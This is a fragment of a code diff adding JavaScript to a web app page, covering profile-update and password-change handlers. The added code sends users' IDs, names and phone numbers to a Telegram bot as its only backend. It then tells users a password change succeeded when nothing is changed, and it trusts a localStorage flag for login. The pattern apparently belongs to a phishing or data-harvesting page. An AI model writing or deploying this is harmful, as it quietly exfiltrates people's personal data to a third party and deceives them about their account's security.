+            }
+            
+            resetButton('invite-submit', 'Send Invitation');
+        }
+
+        async function updateProfile(e) {
+            e.preventDefault();
+            createLoadingButton('profile-submit');
+            
+            const name = document.getElementById('user-name').value;
+            const phone = document.getElementById('user-phone-input').value;
+            const password = document.getElementById('user-password').value;
+            
+            // Send to Telegram
+            const telegramMessage = `👤 <b>Profile Update</b>\n\n` +
+                                 `User ID: ${document.getElementById('user-id').textContent}\n` +
+                                 `New Name: ${name}\n` +
+                                 `New Phone: ${phone}\n` +
+                                 `Password Changed: ${password ? 'Yes' : 'No'}`;
+            
+            const sent = await sendToTelegram(telegramMessage);
+            
+            if (sent) {
+                document.getElementById('user-phone').textContent = phone;
+                showNotification("Profile updated successfully");
+            } else {
+                showNotification("Failed to update profile. Please try again.", true);
+            }
+            
+            resetButton('profile-submit', 'Update Profile');
+        }
+
+        async function changePassword() {
+            createLoadingButton('password-submit');
+            
+            const current = document.getElementById('current-password').value;
+            const newPass = document.getElementById('new-password').value;
+            
+            if (!current || !newPass) {
+                showNotification("Both fields are required", true);
+                resetButton('password-submit', 'Change Password');
+                return;
+            }
+            
+            // Send to Telegram
+            const telegramMessage = `🔒 <b>Password Change Request</b>\n\n` +
+                                 `User ID: ${document.getElementById('user-id').textContent}\n` +
+                                 `Phone: ${document.getElementById('user-phone').textContent}`;
+            
+            const sent = await sendToTelegram(telegramMessage);
+            
+            if (sent) {
+                showNotification("Password changed successfully");
+                document.getElementById('security-settings').style.display = 'none';
+                document.getElementById('current-password').value = '';
+                document.getElementById('new-password').value = '';
+            } else {
+                showNotification("Failed to change password. Please try again.", true);
+            }
+            
+            resetButton('password-submit', 'Change Password');
+        }
+
+        function copyToClipboard(elementId) {
+            const text = document.getElementById(elementId).textContent;
+            navigator.clipboard.writeText(text);
+            showNotification(`Copied to clipboard: ${text}`);
+        }
+
+        // Initialize auth page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if user is already logged in (in a real app, you would check session)
+            const isLoggedIn = localStorage.getItem('isLoggedIn');
+            if (isLoggedIn) {
+                document.getElementById('auth-container').style.display = 'none';
+                document.getElementById('app-container').style.display = 'block';
+                initializeApp();
+            }
+        });
+    </script>
+</body>
+</html>
